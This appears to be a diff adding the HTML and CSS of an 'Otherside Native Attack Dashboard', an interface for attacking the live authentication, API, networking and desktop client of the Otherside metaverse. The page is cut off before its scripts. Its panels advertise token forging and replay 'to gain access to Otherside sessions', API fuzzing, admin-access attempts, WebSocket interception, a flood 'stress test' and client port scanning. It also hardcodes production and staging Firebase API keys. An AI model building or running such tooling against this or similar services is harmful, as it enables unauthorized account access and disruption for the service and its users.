@@ -1,0 +1,2521 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>M² ODK — Otherside Native Attack Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+        .navbar {
+            background: #111;
+            border-bottom: 1px solid #2a2a2a;
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .navbar-brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 700;
+            font-size: 14px;
+        }
+        .navbar-brand .logo {
+            width: 32px; height: 32px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            color: #fff;
+        }
+        .navbar-tag {
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 4px;
+            background: #7f1d1d;
+            color: #fca5a5;
+            font-weight: 600;
+        }
+        .navbar-links {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+        .navbar-links a {
+            color: #888;
+            text-decoration: none;
+            font-size: 12px;
+            transition: color 0.2s;
+        }
+        .navbar-links a:hover { color: #e0e0e0; }
+
+        .main { padding: 24px; max-width: 1500px; margin: 0 auto; }
+
+        .hero {
+            text-align: center;
+            padding: 32px 20px;
+            margin-bottom: 24px;
+            background: linear-gradient(135deg, #1a0a2e 0%, #0a0a0a 50%, #0a1a0a 100%);
+            border: 1px solid #2a2a2a;
+            border-radius: 16px;
+        }
+        .hero h1 {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6, #a78bfa);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .hero .subtitle { color: #888; font-size: 14px; }
+        .hero .tech-badges {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin-top: 16px;
+            flex-wrap: wrap;
+        }
+        .tech-badge {
+            font-size: 10px;
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-weight: 600;
+        }
+
+        .phase-nav {
+            display: flex;
+            gap: 4px;
+            margin-bottom: 24px;
+            background: #111;
+            border-radius: 12px;
+            padding: 4px;
+            border: 1px solid #2a2a2a;
+            flex-wrap: wrap;
+        }
+        .phase-btn {
+            flex: 1;
+            min-width: 140px;
+            padding: 12px 8px;
+            background: transparent;
+            color: #888;
+            border: none;
+            border-radius: 10px;
+            font-size: 11px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+        }
+        .phase-btn:hover { color: #ccc; background: #1a1a1a; }
+        .phase-btn.active {
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            color: #fff;
+        }
+        .phase-btn .phase-num {
+            display: block;
+            font-size: 16px;
+            font-weight: 800;
+            margin-bottom: 2px;
+        }
+        .phase-btn .phase-label {
+            display: block;
+            font-size: 10px;
+            opacity: 0.8;
+        }
+
+        .phase-content { display: none; }
+        .phase-content.active { display: block; }
+
+        .card {
+            background: #141414;
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 16px;
+        }
+        .card h3 {
+            font-size: 15px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .card h3 .badge {
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-weight: 600;
+        }
+        .badge-red { background: #7f1d1d; color: #fca5a5; }
+        .badge-orange { background: #7c2d12; color: #fdba74; }
+        .badge-green { background: #14532d; color: #86efac; }
+        .badge-blue { background: #1e3a5f; color: #93c5fd; }
+        .badge-purple { background: #4a1d6a; color: #d8b4fe; }
+        .badge-yellow { background: #713f12; color: #fde047; }
+        .badge-cyan { background: #0e3a3a; color: #67e8f9; }
+
+        .console {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 8px;
+            padding: 12px;
+            max-height: 500px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            line-height: 1.8;
+        }
+        .console::-webkit-scrollbar { width: 6px; }
+        .console::-webkit-scrollbar-track { background: #0a0a0a; }
+        .console::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
+        .log-info { color: #93c5fd; }
+        .log-success { color: #86efac; }
+        .log-warning { color: #fbbf24; }
+        .log-error { color: #fca5a5; }
+        .log-data { color: #c4b5fd; }
+        .log-critical { color: #ff6b6b; font-weight: bold; }
+        .log-dim { color: #555; }
+
+        .btn {
+            padding: 10px 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            color: #fff;
+        }
+        .btn-primary:hover { opacity: 0.9; }
+        .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; }
+        .btn-danger { background: #7f1d1d; color: #fca5a5; }
+        .btn-danger:hover { background: #991b1b; }
+        .btn-outline { background: transparent; color: #888; border: 1px solid #2a2a2a; }
+        .btn-outline:hover { border-color: #555; color: #ccc; }
+        .btn-green { background: #14532d; color: #86efac; }
+        .btn-green:hover { background: #166534; }
+        .btn-orange { background: #7c2d12; color: #fdba74; }
+        .btn-orange:hover { background: #9a3412; }
+        .btn-cyan { background: #0e3a3a; color: #67e8f9; }
+        .btn-cyan:hover { background: #155e5e; }
+
+        .btn-row {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-bottom: 12px;
+        }
+
+        .input-group { margin-bottom: 12px; }
+        .input-group label { display: block; font-size: 12px; color: #888; margin-bottom: 4px; }
+        .input-group input, .input-group select, .input-group textarea {
+            width: 100%;
+            padding: 10px;
+            background: #0a0a0a;
+            border: 1px solid #2a2a2a;
+            border-radius: 8px;
+            color: #e0e0e0;
+            font-size: 13px;
+            outline: none;
+        }
+        .input-group textarea { font-family: 'Courier New', monospace; font-size: 11px; min-height: 80px; resize: vertical; }
+        .input-group input:focus, .input-group textarea:focus, .input-group select:focus { border-color: #6366f1; }
+
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+        .grid-3 {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 16px;
+        }
+        @media (max-width: 900px) {
+            .grid-2, .grid-3 { grid-template-columns: 1fr; }
+        }
+
+        .alert-box {
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 12px;
+            font-size: 12px;
+            line-height: 1.6;
+        }
+        .alert-critical { background: #2d0a0a; border: 1px solid #7f1d1d; color: #fca5a5; }
+        .alert-warning { background: #2d1a0a; border: 1px solid #7c2d12; color: #fdba74; }
+        .alert-info { background: #0a1a2d; border: 1px solid #1e3a5f; color: #93c5fd; }
+        .alert-success { background: #0a2d1a; border: 1px solid #14532d; color: #86efac; }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+        .stat {
+            background: #111;
+            border: 1px solid #2a2a2a;
+            border-radius: 8px;
+            padding: 14px;
+            text-align: center;
+        }
+        .stat-value { font-size: 24px; font-weight: 800; }
+        .stat-value.v-blue { color: #6366f1; }
+        .stat-value.v-green { color: #86efac; }
+        .stat-value.v-red { color: #fca5a5; }
+        .stat-value.v-yellow { color: #fbbf24; }
+        .stat-value.v-purple { color: #d8b4fe; }
+        .stat-value.v-cyan { color: #67e8f9; }
+        .stat-label { font-size: 10px; color: #888; margin-top: 4px; }
+
+        .progress-bar {
+            height: 4px;
+            background: #1a1a1a;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-bottom: 12px;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #6366f1, #8b5cf6);
+            width: 0%;
+            transition: width 0.3s;
+        }
+
+        .arch-diagram {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 8px;
+            padding: 16px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            line-height: 1.6;
+            white-space: pre;
+            overflow-x: auto;
+            color: #c4b5fd;
+        }
+
+        .flow-step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 14px;
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 8px;
+            margin-bottom: 8px;
+            font-size: 12px;
+            transition: all 0.2s;
+        }
+        .flow-step:hover { border-color: #6366f1; }
+        .flow-step .step-num {
+            width: 28px; height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 800;
+            flex-shrink: 0;
+        }
+        .flow-step .step-num.num-blue { background: #1e3a5f; color: #93c5fd; }
+        .flow-step .step-num.num-green { background: #14532d; color: #86efac; }
+        .flow-step .step-num.num-red { background: #7f1d1d; color: #fca5a5; }
+        .flow-step .step-num.num-orange { background: #7c2d12; color: #fdba74; }
+        .flow-step .step-num.num-purple { background: #4a1d6a; color: #d8b4fe; }
+        .flow-step .step-num.num-cyan { background: #0e3a3a; color: #67e8f9; }
+        .flow-step .step-title { font-weight: 700; color: #e0e0e0; }
+        .flow-step .step-desc { color: #888; font-size: 11px; }
+
+        .packet-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 11px;
+        }
+        .packet-table th {
+            background: #1a1a1a;
+            padding: 8px;
+            text-align: left;
+            color: #888;
+            border-bottom: 1px solid #2a2a2a;
+        }
+        .packet-table td {
+            padding: 6px 8px;
+            border-bottom: 1px solid #1a1a1a;
+            font-family: 'Courier New', monospace;
+            font-size: 10px;
+            color: #c4b5fd;
+            word-break: break-all;
+        }
+        .packet-table tr:hover td { background: #111; }
+
+        .tab-sub {
+            display: flex;
+            gap: 4px;
+            margin-bottom: 16px;
+        }
+        .tab-sub button {
+            padding: 8px 14px;
+            background: #111;
+            border: 1px solid #2a2a2a;
+            border-radius: 8px;
+            color: #888;
+            font-size: 11px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .tab-sub button:hover { color: #ccc; }
+        .tab-sub button.active {
+            background: #6366f1;
+            color: #fff;
+            border-color: #6366f1;
+        }
+
+        .endpoint-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 8px;
+        }
+        .ep-item {
+            padding: 10px;
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 8px;
+            font-size: 11px;
+            font-family: 'Courier New', monospace;
+        }
+        .ep-item.ep-ok { border-color: #14532d; }
+        .ep-item.ep-fail { border-color: #7f1d1d; }
+        .ep-item.ep-warn { border-color: #7c2d12; }
+        .ep-item .ep-method { font-weight: 700; color: #93c5fd; }
+
+        .token-display {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 8px;
+            padding: 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            word-break: break-all;
+            max-height: 200px;
+            overflow-y: auto;
+            line-height: 1.8;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 12px; height: 12px;
+            border: 2px solid #333;
+            border-top-color: #6366f1;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .pulse { animation: pulse 2s ease-in-out infinite; }
+        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="navbar-brand">
+            <div class="logo">M²</div>
+            <span>M² ODK — Native Attack</span>
+            <span class="navbar-tag">SECURITY RESEARCH</span>
+        </div>
+        <div class="navbar-links">
+            <a href="/custom-token-attack.html">Firebase Attack</a>
+            <a href="/otherside-native-attack.html" style="color:#6366f1;">Native Attack</a>
+            <a href="https://docs.otherside.xyz" target="_blank">ODK Docs</a>
+        </div>
+    </nav>
+
+    <div class="main">
+        <!-- Hero Section -->
+        <div class="hero">
+            <h1>Otherside Native Attack Dashboard</h1>
+            <div class="subtitle">Comprehensive security research toolkit for Otherside's native infrastructure — Glyph Auth, Agentic API, Morpheus Network, Desktop Client & Pixel Streaming</div>
+            <div class="tech-badges">
+                <span class="tech-badge badge-purple">Glyph OAuth</span>
+                <span class="tech-badge badge-cyan">Agentic API</span>
+                <span class="tech-badge badge-orange">Morpheus/SpatialOS</span>
+                <span class="tech-badge badge-blue">Unreal Engine 5</span>
+                <span class="tech-badge badge-green">Pixel Streaming</span>
+                <span class="tech-badge badge-red">Native Client</span>
+            </div>
+        </div>
+
+        <!-- Phase Navigation -->
+        <div class="phase-nav">
+            <button class="phase-btn active" onclick="switchPhase('glyph')">
+                <span class="phase-num">1</span>
+                <span class="phase-label">Glyph Auth</span>
+            </button>
+            <button class="phase-btn" onclick="switchPhase('agentic')">
+                <span class="phase-num">2</span>
+                <span class="phase-label">Agentic API</span>
+            </button>
+            <button class="phase-btn" onclick="switchPhase('morpheus')">
+                <span class="phase-num">3</span>
+                <span class="phase-label">Morpheus Net</span>
+            </button>
+            <button class="phase-btn" onclick="switchPhase('native')">
+                <span class="phase-num">4</span>
+                <span class="phase-label">Native Client</span>
+            </button>
+            <button class="phase-btn" onclick="switchPhase('streaming')">
+                <span class="phase-num">5</span>
+                <span class="phase-label">Pixel Stream</span>
+            </button>
+        </div>
+
+        <!-- Global Stats -->
+        <div class="stats">
+            <div class="stat">
+                <div class="stat-value v-blue" id="statEndpoints">0</div>
+                <div class="stat-label">Endpoints Tested</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value v-green" id="statDiscovered">0</div>
+                <div class="stat-label">APIs Discovered</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value v-red" id="statVulns">0</div>
+                <div class="stat-label">Vulns Found</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value v-yellow" id="statTokens">0</div>
+                <div class="stat-label">Tokens Captured</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value v-purple" id="statPackets">0</div>
+                <div class="stat-label">Packets Analyzed</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value v-cyan" id="statSessions">0</div>
+                <div class="stat-label">Sessions</div>
+            </div>
+        </div>
+
+        <!-- ================================================================ -->
+        <!-- PHASE 1: GLYPH AUTH -->
+        <!-- ================================================================ -->
+        <div class="phase-content active" id="phase-glyph">
+            <div class="card">
+                <h3>🔑 Phase 1: Glyph Authentication Analysis <span class="badge badge-purple">Glyph OAuth</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    Glyph is Otherside's authentication hub — it handles login, wallet integration, and fiat onramping. Understanding Glyph's OAuth flow is critical for building tools that interact with the native client.
+                </p>
+                <div class="alert-box alert-info">
+                    <strong>Glyph Architecture:</strong> Glyph (useglyph.io) acts as an OAuth2 provider for Otherside. It bridges wallet-based auth (MetaMask, WalletConnect) with traditional OAuth tokens. The flow: Wallet Signature → Glyph OIDC → Firebase Custom Token → Otherside Session.
+                </div>
+            </div>
+
+            <div class="grid-2">
+                <div class="card">
+                    <h3>Glyph OAuth Discovery <span class="badge badge-blue">Recon</span></h3>
+                    <div class="btn-row">
+                        <button class="btn btn-primary" onclick="discoverGlyphOIDC()">Discover OIDC Config</button>
+                        <button class="btn btn-outline" onclick="probeGlyphAuth()">Probe Auth Endpoints</button>
+                        <button class="btn btn-outline" onclick="fetchGlyphJWKS()">Fetch JWKS Keys</button>
+                    </div>
+                    <div class="progress-bar"><div class="progress-fill" id="glyphProgress"></div></div>
+                    <div class="console" id="glyphLog">
+                        <div class="log-info">[GLYPH] Ready to discover Glyph OAuth2/OIDC configuration.</div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>Glyph Auth Flow <span class="badge badge-purple">Architecture</span></h3>
+                    <div class="arch-diagram" id="glyphArchDiagram">
+┌─────────────┐     ┌──────────────┐     ┌──────────────┐
+│  User Wallet │────▶│  Glyph Auth  │────▶│ Firebase Auth│
+│  (MetaMask)  │     │  (OAuth2)    │     │ (CustomToken)│
+└─────────────┘     └──────┬───────┘     └──────┬───────┘
+                           │                     │
+                    ┌──────▼───────┐     ┌───────▼──────┐
+                    │  OIDC Token  │     │  ID Token    │
+                    │  (JWT)       │     │  + Refresh   │
+                    └──────┬───────┘     └───────┬──────┘
+                           │                     │
+                    ┌──────▼─────────────────────▼──────┐
+                    │      Otherside Session             │
+                    │  (odk.otherside.xyz/api/v0)        │
+                    └───────────────────────────────────┘</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Glyph Token Forge <span class="badge badge-red">Attack</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    If we understand the Glyph → Firebase token exchange, we can forge or replay authentication tokens to gain access to Otherside sessions.
+                </p>
+                <div class="grid-2">
+                    <div class="input-group">
+                        <label>Glyph Client ID (auto-discovered or manual):</label>
+                        <input type="text" id="glyphClientId" placeholder="glyph-client-id...">
+                    </div>
+                    <div class="input-group">
+                        <label>Glyph Redirect URI:</label>
+                        <input type="text" id="glyphRedirectUri" value="https://www.otherside.xyz/callback">
+                    </div>
+                    <div class="input-group">
+                        <label>Wallet Address (for SIWE flow):</label>
+                        <input type="text" id="glyphWalletAddr" placeholder="0x...">
+                    </div>
+                    <div class="input-group">
+                        <label>Firebase API Key:</label>
+                        <select id="glyphFirebaseKey">
+                            <option value="AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0">Production (scarcely-calm-lark)</option>
+                            <option value="AIzaSyDrPI4Q-rdqamOFDw2oZOo7SC8QiEukoRc">Production (Email Link)</option>
+                            <option value="AIzaSyBQbSILg49HPwSBsw4TTV5fw1ZhkRvgCKU">Staging (primarily-endless-elephant)</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="attemptGlyphTokenExchange()">Attempt Token Exchange</button>
+                    <button class="btn btn-outline" onclick="buildSIWEMessage()">Build SIWE Message</button>
+                    <button class="btn btn-outline" onclick="testGlyphCallback()">Test Callback URLs</button>
+                    <button class="btn btn-danger" onclick="glyphTokenReplay()">Token Replay Attack</button>
+                </div>
+                <div class="progress-bar"><div class="progress-fill" id="glyphForgeProgress"></div></div>
+                <div class="console" id="glyphForgeLog">
+                    <div class="log-info">[GLYPH-FORGE] Ready to analyze and test Glyph authentication flows.</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Glyph ↔ Firebase Token Bridge <span class="badge badge-cyan">Integration</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    This tool bridges Glyph OIDC tokens with Firebase Custom Tokens, enabling authentication to Otherside's backend via the same flow used by the native client.
+                </p>
+                <div class="input-group">
+                    <label>Glyph OIDC Token (JWT from Glyph auth):</label>
+                    <textarea id="glyphOidcToken" placeholder="eyJhbGciOiJSUzI1NiIs..."></textarea>
+                </div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="decodeGlyphToken()">Decode & Validate Token</button>
+                    <button class="btn btn-green" onclick="exchangeGlyphForFirebase()">Exchange for Firebase Token</button>
+                    <button class="btn btn-outline" onclick="testGlyphScopes()">Test Available Scopes</button>
+                </div>
+                <div class="console" id="glyphBridgeLog">
+                    <div class="log-info">[GLYPH-BRIDGE] Paste a Glyph OIDC token or discover one via the tools above.</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================================================================ -->
+        <!-- PHASE 2: AGENTIC API -->
+        <!-- ================================================================ -->
+        <div class="phase-content" id="phase-agentic">
+            <div class="card">
+                <h3>🤖 Phase 2: Otherside Agentic API <span class="badge badge-cyan">Agentic</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    The Otherside Agentic API allows programmatic interaction with the Otherside metaverse. It enables agents to perform actions, query world state, interact with NPCs, and execute quests — all through a RESTful/WebSocket API.
+                </p>
+                <div class="alert-box alert-info">
+                    <strong>Discovery:</strong> The Agentic API is documented in ODK docs but the endpoint URL structure follows <code>odk.otherside.xyz/api/v0/agent/*</code>. This section maps all available endpoints and builds a functional client.
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Agentic API Endpoint Mapper <span class="badge badge-blue">Recon</span></h3>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="mapAgenticAPI()">Map All Agentic Endpoints</button>
+                    <button class="btn btn-outline" onclick="probeAgentEndpoints()">Probe Known Paths</button>
+                    <button class="btn btn-outline" onclick="fuzzAgenticAPI()">Fuzz API Paths</button>
+                    <button class="btn btn-green" onclick="testAgentAuth()">Test Authentication</button>
+                </div>
+                <div class="progress-bar"><div class="progress-fill" id="agenticProgress"></div></div>
+                <div class="console" id="agenticLog">
+                    <div class="log-info">[AGENTIC] Ready to map and test Agentic API endpoints.</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Agentic API Client <span class="badge badge-green">Interactive</span></h3>
+                <div class="input-group">
+                    <label>Authentication Token:</label>
+                    <input type="text" id="agenticToken" placeholder="Firebase ID Token or Glyph OIDC Token">
+                </div>
+                <div class="grid-2">
+                    <div class="input-group">
+                        <label>API Endpoint:</label>
+                        <select id="agenticEndpoint">
+                            <option value="agent/status">Agent Status</option>
+                            <option value="agent/worlds">List Worlds</option>
+                            <option value="agent/players">Player Query</option>
+                            <option value="agent/npcs">NPC Interaction</option>
+                            <option value="agent/quests">Quest Management</option>
+                            <option value="agent/inventory">Inventory Access</option>
+                            <option value="agent/chat">Chat/Communication</option>
+                            <option value="agent/teleport">Teleportation</option>
+                            <option value="agent/build">Build Mode</option>
+                            <option value="agent/permissions">Permission Check</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>HTTP Method:</label>
+                        <select id="agenticMethod">
+                            <option value="GET">GET</option>
+                            <option value="POST">POST</option>
+                            <option value="PUT">PUT</option>
+                            <option value="DELETE">DELETE</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label>Request Body (JSON):</label>
+                    <textarea id="agenticBody" placeholder='{"action": "query", "target": "world_state"}'></textarea>
+                </div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="sendAgenticRequest()">Send Request</button>
+                    <button class="btn btn-cyan" onclick="startAgenticSession()">Start Agent Session</button>
+                    <button class="btn btn-outline" onclick="batchAgenticScan()">Batch Scan All</button>
+                </div>
+                <div class="console" id="agenticClientLog">
+                    <div class="log-info">[AGENT-CLIENT] Enter token and select endpoint to interact with Agentic API.</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Discovered Agentic Endpoints <span class="badge badge-purple">Results</span></h3>
+                <div class="endpoint-list" id="agenticEndpoints">
+                    <div style="color:#888;font-size:12px;">Run endpoint mapper to discover Agentic API endpoints.</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================================================================ -->
+        <!-- PHASE 3: MORPHEUS NETWORK -->
+        <!-- ================================================================ -->
+        <div class="phase-content" id="phase-morpheus">
+            <div class="card">
+                <h3>🌐 Phase 3: Morpheus Network Analysis <span class="badge badge-orange">Morpheus/SpatialOS</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    Morpheus is MSquared's networking layer built on top of Improbable's SpatialOS. It handles entity replication, RPCs, and world state synchronization across thousands of concurrent players.
+                </p>
+                <div class="alert-box alert-warning">
+                    <strong>Key Insight:</strong> Morpheus uses a proprietary protocol over WebSocket. The native client connects to Morpheus workers via <code>wss://*.msquared.io/*</code> endpoints. Understanding this protocol is essential for building tools that interact with the game world.
+                </div>
+            </div>
+
+            <div class="grid-2">
+                <div class="card">
+                    <h3>Morpheus Endpoint Discovery <span class="badge badge-blue">Recon</span></h3>
+                    <div class="btn-row">
+                        <button class="btn btn-primary" onclick="discoverMorpheusEndpoints()">Discover Morpheus Endpoints</button>
+                        <button class="btn btn-outline" onclick="probeMSquaredInfrastructure()">Probe MSquared Infra</button>
+                        <button class="btn btn-outline" onclick="resolveMorpheusDNS()">DNS Resolution</button>
+                    </div>
+                    <div class="progress-bar"><div class="progress-fill" id="morpheusProgress"></div></div>
+                    <div class="console" id="morpheusLog">
+                        <div class="log-info">[MORPHEUS] Ready to discover and analyze Morpheus networking.</div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>Morpheus Architecture <span class="badge badge-orange">Protocol</span></h3>
+                    <div class="arch-diagram">
+┌──────────────┐   WebSocket   ┌─────────────────┐
+│ Native Client │◄────────────▶│  Morpheus Gateway│
+│ (Unreal 5.5)  │   wss://     │  (*.msquared.io) │
+└──────┬───────┘               └────────┬────────┘
+       │                                │
+       │ Entity RPCs                    │ Entity Replication
+       │ Commands                       │ Component Updates
+       ▼                                ▼
+┌──────────────┐               ┌────────────────┐
+│ SpatialOS    │◄─────────────▶│  Worker Nodes   │
+│ Runtime      │               │  (Game Logic)   │
+└──────┬───────┘               └────────────────┘
+       │
+       ▼
+┌──────────────┐
+│  World State  │
+│  (Entities)   │
+└──────────────┘</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>WebSocket Packet Interceptor <span class="badge badge-red">MITM</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    Connect to Morpheus WebSocket endpoints and capture/analyze the binary and JSON protocol messages exchanged between the client and server.
+                </p>
+                <div class="input-group">
+                    <label>Morpheus WebSocket URL:</label>
+                    <input type="text" id="morpheusWSUrl" placeholder="wss://gateway.msquared.io/v1/connect">
+                </div>
+                <div class="input-group">
+                    <label>Auth Token (from Glyph/Firebase):</label>
+                    <input type="text" id="morpheusAuthToken" placeholder="Bearer token...">
+                </div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="connectMorpheusWS()">Connect & Capture</button>
+                    <button class="btn btn-outline" onclick="sendMorpheusCommand()">Send Custom Command</button>
+                    <button class="btn btn-danger" onclick="floodMorpheusWS()">Stress Test</button>
+                    <button class="btn btn-green" onclick="analyzeMorpheusProtocol()">Analyze Protocol</button>
+                </div>
+                <div class="console" id="morpheusWSLog" style="max-height:400px;">
+                    <div class="log-info">[MORPHEUS-WS] Ready to connect and analyze Morpheus WebSocket protocol.</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Captured Packets <span class="badge badge-green">Capture</span></h3>
+                <div style="overflow-x:auto;">
+                    <table class="packet-table">
+                        <thead>
+                            <tr>
+                                <th>#</th>
+                                <th>Direction</th>
+                                <th>Type</th>
+                                <th>Size</th>
+                                <th>Timestamp</th>
+                                <th>Preview</th>
+                            </tr>
+                        </thead>
+                        <tbody id="morpheusPackets">
+                            <tr><td colspan="6" style="color:#888;text-align:center;">No packets captured yet.</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================================================================ -->
+        <!-- PHASE 4: NATIVE CLIENT -->
+        <!-- ================================================================ -->
+        <div class="phase-content" id="phase-native">
+            <div class="card">
+                <h3>🖥️ Phase 4: Native Client Interaction <span class="badge badge-red">Desktop App</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    Otherside's native desktop client is an Unreal Engine 5 application distributed via otherside.center. This section provides tools for analyzing, hooking, and interacting with the client process.
+                </p>
+                <div class="alert-box alert-critical">
+                    <strong>Client Architecture:</strong> The Otherside desktop client is an Unreal Engine 5.5.4 application using Morpheus networking. It connects to MSquared infrastructure via WebSocket and uses Glyph for authentication. The client binary contains ODK plugin code, wallet integration, and world navigation logic.
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Native Client Reconnaissance <span class="badge badge-blue">Analysis</span></h3>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="analyzeNativeClient()">Analyze Client Structure</button>
+                    <button class="btn btn-outline" onclick="enumerateClientAPIs()">Enumerate Client APIs</button>
+                    <button class="btn btn-outline" onclick="extractClientConfig()">Extract Config Files</button>
+                    <button class="btn btn-outline" onclick="scanClientPorts()">Scan Client Ports</button>
+                </div>
+                <div class="progress-bar"><div class="progress-fill" id="nativeProgress"></div></div>
+                <div class="console" id="nativeLog">
+                    <div class="log-info">[NATIVE] Ready to analyze the Otherside native desktop client.</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>ODK Dashboard API Interaction <span class="badge badge-purple">API</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    The client communicates with ODK Dashboard at <code>odk.otherside.xyz/api/v0/</code>. These APIs manage worlds, projects, organizations, and sessions.
+                </p>
+                <div class="input-group">
+                    <label>ID Token (from Firebase/Glyph auth):</label>
+                    <input type="text" id="nativeToken" placeholder="Firebase ID Token">
+                </div>
+                <div class="tab-sub">
+                    <button class="active" onclick="switchNativeSub('odk')">ODK Dashboard</button>
+                    <button onclick="switchNativeSub('wallet')">Wallet API</button>
+                    <button onclick="switchNativeSub('world')">World Travel</button>
+                    <button onclick="switchNativeSub('session')">Sessions</button>
+                </div>
+
+                <!-- ODK Dashboard Sub-tab -->
+                <div id="nativeSub-odk">
+                    <div class="btn-row">
+                        <button class="btn btn-primary" onclick="probeODKDashboard()">Probe ODK Dashboard</button>
+                        <button class="btn btn-outline" onclick="listODKProjects()">List Projects</button>
+                        <button class="btn btn-outline" onclick="getODKPermissions()">Check Permissions</button>
+                        <button class="btn btn-green" onclick="tryODKAdmin()">Try Admin Access</button>
+                    </div>
+                </div>
+                <div id="nativeSub-wallet" style="display:none;">
+                    <div class="btn-row">
+                        <button class="btn btn-primary" onclick="probeWalletAPI()">Probe Wallet API</button>
+                        <button class="btn btn-outline" onclick="testWalletNonce()">Get Wallet Nonce</button>
